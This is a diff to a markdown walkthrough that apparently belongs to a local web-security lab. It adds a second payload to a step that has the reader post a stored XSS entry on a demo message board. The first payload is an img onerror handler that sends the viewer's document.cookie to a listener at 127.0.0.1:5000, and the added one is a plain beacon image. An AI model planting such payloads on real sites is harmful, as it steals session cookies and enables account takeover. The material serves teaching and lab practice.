@@ -15,9 +15,15 @@ All four servers running. Log in to http://localhost:3000 as `demo`/`demo`.
 Post this as a new message-board entry through the real app — you're
 planting it yourself, as a normal logged-in user, not via CSRF:
 
+### Payload a
+
 ```html
 <img src="x" onerror="new Image().src = 'http://127.0.0.1:5000/beacon.png?c=' + encodeURIComponent(document.cookie);">
 ```
+
+### Payload b
+
+<img src='http://127.0.0.1:5000/beacon.png'>
 
 ## Watch the attack succeed
 
